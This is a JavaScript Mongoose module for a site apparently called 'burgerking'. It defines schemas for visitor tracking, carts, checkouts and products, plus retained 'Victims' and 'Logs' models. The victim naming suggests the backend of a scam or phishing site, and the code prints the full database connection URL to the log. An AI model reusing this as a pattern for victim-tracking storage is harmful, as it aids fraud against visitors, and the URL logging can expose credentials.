const mongoose = require('mongoose');

// Локальная разработка - SQLite, Railway - MongoDB
const isProduction = process.env.NODE_ENV === 'production' || process.env.RAILWAY_ENVIRONMENT;
const isRailway = process.env.RAILWAY_ENVIRONMENT;

const mongoUrl = isRailway ? 
  process.env.MONGO_URL || process.env.MONGODB_URL || process.env.DATABASE_URL :
  'mongodb://localhost:27017/burgerking';

// Подключение к MongoDB
async function connectMongoDB() {
  try {
    console.log('🔄 Подключение к MongoDB...');
    console.log('📍 MONGO_URL:', process.env.MONGO_URL ? 'SET' : 'NOT SET');
    console.log('📍 MONGODB_URL:', process.env.MONGODB_URL ? 'SET' : 'NOT SET');
    console.log('📍 DATABASE_URL:', process.env.DATABASE_URL ? 'SET' : 'NOT SET');
    console.log('📍 Using URL:', mongoUrl);
    
    await mongoose.connect(mongoUrl);
    console.log('✅ MongoDB подключена успешно');
    return true;
  } catch (error) {
    console.error('❌ Ошибка подключения к MongoDB:', error.message);
    return false;
  }
}

// Схемы для MongoDB
const userSchema = new mongoose.Schema({
  userId: { type: String, required: true, unique: true },
  ip: { type: String, required: true },
  userAgent: { type: String },
  referrer: { type: String },
  firstVisit: { type: Date, default: Date.now },
  lastVisit: { type: Date, default: Date.now },
  visitCount: { type: Number, default: 1 },
  createdAt: { type: Date, default: Date.now }
});

const visitSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  page: { type: String, required: true },
  timestamp: { type: Date, default: Date.now },
  sessionId: { type: String },
  ip: { type: String },
  userAgent: { type: String }
});

const cartSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  sessionId: { type: String, required: true },
  items: [{
    productId: { type: String, required: true },
    name: { type: String, required: true },
    price: { type: Number, required: true },
    quantity: { type: Number, default: 1 },
    customizations: { type: Object, default: {} }
  }],
  totalAmount: { type: Number, required: true },
  createdAt: { type: Date, default: Date.now },
  updatedAt: { type: Date, default: Date.now }
});

const checkoutSchema = new mongoose.Schema({
  userId: { type: String, required: true },
  sessionId: { type: String, required: true },
  cartId: { type: String, required: true },
  totalAmount: { type: Number, required: true },
  status: { type: String, default: 'pending', enum: ['pending', 'processing', 'completed', 'failed'] },
  paymentMethod: { type: String },
  createdAt: { type: Date, default: Date.now }
});

const productSchema = new mongoose.Schema({
  title: { type: String, required: true },
  description: { type: String, required: true },
  price: { type: Number, required: true },
  image: { type: String, required: true },
  tag: { type: String, required: true, unique: true },
  createdAt: { type: Date, default: Date.now }
});

// Старые схемы для совместимости
const victimSchema = new mongoose.Schema({
  id: { type: String, required: true, unique: true },
  ip: { type: String, required: true },
  discount: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const logSchema = new mongoose.Schema({
  victimId: { type: String, required: true },
  status: { type: String, default: 'pending' },
  data: { type: Object, default: {} },
  createdAt: { type: Date, default: Date.now }
});

// Модели
const Users = mongoose.model('Users', userSchema);
const Visits = mongoose.model('Visits', visitSchema);
const Carts = mongoose.model('Carts', cartSchema);
const Checkouts = mongoose.model('Checkouts', checkoutSchema);
const Products = mongoose.model('Products', productSchema);

// Старые модели для совместимости
const Victims = mongoose.model('Victims', victimSchema);
const Logs = mongoose.model('Logs', logSchema);

module.exports = {
  connectMongoDB,
  Users,
  Visits,
  Carts,
  Checkouts,
  Products,
  Victims,
  Logs,
  mongoose
};
